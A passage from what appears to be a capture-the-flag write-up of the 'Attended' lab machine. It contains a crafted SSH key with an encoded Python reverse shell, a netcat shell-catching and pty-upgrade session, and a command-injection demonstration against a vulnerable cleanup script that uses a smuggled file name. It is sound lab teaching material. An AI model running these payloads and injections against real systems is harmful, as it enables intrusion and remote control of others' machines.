ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAE6gDML3Vzci9sb2NhbC9iaW4vcHl0aG9uMgAtYwBpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMTQiLDQ0MykpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7ANgQYAAAAAAA7xBgAAAAAADyEGAAAAAAAAAAAAAAAAAAsCHASgAAAACSI8BKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAABqA0AAAAAAAOkRYAAAAAAAewNAAAAAAACAA0AAAAAAAGcDQAAAAAAA8RFgAAAAAAB7A0AAAAAAAIADQAAAAAAAagNAAAAAAAAAAAAAAAAAAM8DQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= 0xdf

```

Now with `nc` listening, I’ll SSH to the GW with that key and any valid user on the box (root is a safe guess):

```

attended$ ssh -i .0xdf -p 2222 root@192.168.23.1 

```

At `nc`:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.221] 15307
/bin/sh: No controlling tty (open /dev/tty: Device not configured)
/bin/sh: Can't find tty file descriptor
/bin/sh: warning: won't have full job control
attendedgw#

```

`bash` isn’t installed on OpenBSD, but `ksh` is, so I can use that to get a solid shell:

```

attendedgw# which bash            
which: bash: Command not found.
attendedgw# which ksh
/bin/ksh
attendedgw# python2 -c 'import pty;pty.spawn("ksh")'
attendedgw# ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type network
Terminal type? screen
                                                                         
attendedgw#

```

And get `root.txt`:

```

attendedgw# cat root.txt
1986e853************************

```

## Beyond Root

The automation to run the submitted SSH config files on Attended as freshness is a Python script:

```

#!/usr/local/bin/python2.7
import os,sys
import subprocess
import time

path = '/home/shared/'
command = '/usr/bin/ssh -l freshness -F %s 127.0.0.1'
for r, d, fs in os.walk(path):
        for f in fs:
                cfile = os.path.join(r, f)
                c = command % cfile
                #print "running %s" % c
                p = subprocess.Popen(c,shell=True)
                time.sleep(0.2)
                os.unlink(cfile)

```

Immediately on seeing this, it’s clearly vulnerable to a command injection. This doesn’t buy me anything new beyond what comes with the command execution in the SSH config, but it’s still fun to show.

The script reads the name of each file in the directory, and uses it to generate a string that’s passed to `subprocess.Popen` in an unsafe way.

To demonstrate, I’ll create an empty file and upload it as `/home/shared/k;ping -c 1 10.10.14.14;`:

```

oxdf@parrot$ touch attachments/empty
oxdf@parrot$ python upload.py attachments/empty '/home/shared/k;ping -c 1 10.10.14.14;'; sleep 60
[+] Email sent at 2021-05-02 20:58:13.730171
[+] Waiting for HTTP request
10.10.10.221 - - [02/May/2021 20:58:46] code 404, message File not found
10.10.10.221 - - [02/May/2021 20:58:46] "GET /attachments/empty HTTP/1.1" 404 -

```

The `sleep 60` on the end just helps me know if this returns and still no ICMP, then it didn’t work.

That will create a file with that long name. When Python walks that dir, it will create the string `command`: `/usr/bin/ssh -l freshness -F k;ping -c 1 10.10.14.14; 127.0.0.1`. When that string is passed to `Popen`, It will try to run the ssh and fail because `k` doesn’t exist. Then it will ping my VM. Then it will error on unknown command `127.0.0.1`.

The ICMP packets arrive just under a minute later showing it worked:

```

20:59:38.581451 IP 10.10.10.221 > 10.10.14.14: ICMP echo request, id 51260, seq 0, length 64
20:59:38.581537 IP 10.10.14.14 > 10.10.10.221: ICMP echo reply, id 51260, seq 0, length 64

```